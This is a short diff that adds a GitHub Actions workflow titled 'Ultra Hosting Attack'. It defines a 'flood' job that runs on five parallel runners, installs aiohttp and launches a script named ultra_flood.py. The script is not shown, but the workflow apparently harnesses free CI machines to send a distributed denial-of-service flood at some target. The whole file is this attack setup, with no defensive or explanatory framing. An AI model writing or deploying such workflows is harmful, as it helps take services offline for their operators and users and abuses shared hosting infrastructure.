@@ -1,0 +1,14 @@
+name: Ultra Hosting Attack
+on: workflow_dispatch
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1, 2, 3, 4, 5]
+    steps:
+      - uses: actions/checkout@v3
+      - name: Install
+        run: pip install aiohttp
+      - name: Launch
+        run: python3 ultra_flood.py
